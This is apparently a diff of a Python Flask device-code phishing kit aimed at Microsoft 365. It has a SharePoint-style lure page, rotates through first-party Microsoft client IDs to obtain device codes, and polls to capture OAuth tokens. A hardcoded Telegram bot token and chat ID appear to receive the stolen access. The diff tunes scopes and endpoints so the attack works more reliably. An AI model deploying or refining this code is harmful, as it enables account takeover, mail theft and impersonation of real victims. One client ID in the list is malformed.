@@ -13,28 +13,17 @@ TELEGRAM_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
-CLIENT_SCOPES = {
-    # Outlook Mobile — most reliable, Graph preauthorized
-    "27922004-5251-4030-b22d-91ecd9a37ea4":
-        "https://graph.microsoft.com/Mail.Read "
-        "https://graph.microsoft.com/Mail.Send "
-        "https://graph.microsoft.com/User.Read "
-        "offline_access",
-
-    # Azure CLI
-    "04b07795-8ddb-461a-bbee-02f9e1bf7b46":
-        "https://graph.microsoft.com/Mail.ReadWrite "
-        "https://graph.microsoft.com/Mail.Send "
-        "https://graph.microsoft.com/User.Read "
-        "offline_access",
-
-    # OneDrive Sync Client
-    "b26aadf8-566f-4478-926f-589f601d9c74":
-   ...
-}
-
-CLIENT_IDS = list(CLIENT_SCOPES.keys())
+CLIENT_IDS = [
+    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
+    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
+    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
+    "27922004-5251-4030-b22d-91ecd9a37ea4",  # Outlook Mobile
+    "b5e26448-a5xd-4d13-9a4b-5b9b40a1520e",  # OneDrive (fallback)
+]
 CLIENT_ID_INDEX = 0
+
+# .default avoids AADSTS65002 — no per-resource scope preauthorization needed
+DEVICE_CODE_SCOPE = "https://graph.microsoft.com/.default offline_access openid profile"
 
 app = Flask(__name__)
 shutdown_event = threading.Event()
@@ -122,20 +111,18 @@ def request_device_code():
     global CLIENT_ID_INDEX
     for _ in range(len(CLIENT_IDS)):
         client_id = CLIENT_IDS[CLIENT_ID_INDEX]
-        scope = CLIENT_SCOPES[client_id]
         try:
             resp = requests.post(
-                f"{UPSTREAM}/common/oauth2/v2.0/devicecode",
-                data={"client_id": client_id, "scope": scope},
+                f"{UPSTREAM}/organizations/oauth2/v2.0/devicecode",
+                data={"client_id": client_id, "scope": DEVICE_CODE_SCOPE},
                 timeout=20
             )
             data = resp.json()
             if resp.status_code == 200 and "device_code" in data:
-                print(f"[SESSION] device code issued by {client_id}")
                 return client_id, data
-            print(f"[SESSION] client_id {client_id} failed: {data.get('error', resp.status_code)} "
-                  f"{data.get('error_description', '')[:200]}")
-            CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
+            else:
+                print(f"[SESSION] client_id {client_id} failed: {data.get('error', resp.status_code)}")
+                CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
         except Exception as e:
             print(f"[SESSION] client_id {client_id} exception: {e}")
             CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
@@ -162,7 +149,7 @@ def poll_worker():
                     continue
                 try:
                     resp = requests.post(
-                        f"{UPSTREAM}/common/oauth2/v2.0/token",
+                        f"{UPSTREAM}/organizations/oauth2/v2.0/token",
                         data={
                             "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                             "client_id": client_id,
@@ -210,7 +197,6 @@ def poll_worker():
         shutdown_event.wait(timeout=3)
     print("[WORKER] poll_worker stopped")
 
-# Start worker exactly once, safe under Gunicorn import
 _worker_started = False
 def start_worker():
     global _worker_started
@@ -227,7 +213,7 @@ def _shutdown(sig, frame):
 signal.signal(signal.SIGTERM, _shutdown)
 signal.signal(signal.SIGINT, _shutdown)
 
-# ---------- Page (SharePoint style — your landing page, unchanged) ----------
+# ---------- Page (SharePoint style, unchanged) ----------
 def render_page(user_code, verify_url):
     return f"""<!DOCTYPE html>
 <html lang="en">
